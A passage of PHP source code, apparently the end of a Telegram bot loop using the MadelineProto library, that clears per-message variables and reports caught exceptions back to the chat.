          }
        }
      }
      if (isset($msg)) unset($msg);
      if (isset($chatID)) unset($chatID);
      if (isset($userID)) unset($userID);
      if (isset($type)) unset($type);
      if (isset($msgid)) unset($msgid);
      if (isset($name)) unset($name);
      if (isset($username)) unset($username);
      if (isset($chatusername)) unset($chatusername);
      if (isset($title)) unset($title);
      if (isset($info)) $info = [];
    }
  } catch(Exception $e) {
    echo $strings['error'].$e.PHP_EOL;
    if (isset($chatID) and $settings['send_errors']) {
      try {
        $MadelineProto->messages->sendMessage(['peer' => $chatID, 'message' => '<b>'.$strings['error'].'</b> <code>'.$e->getMessage().'</code>', 'parse_mode' => 'HTML']);
      } catch(Exception $e) { }
    }
  }
}
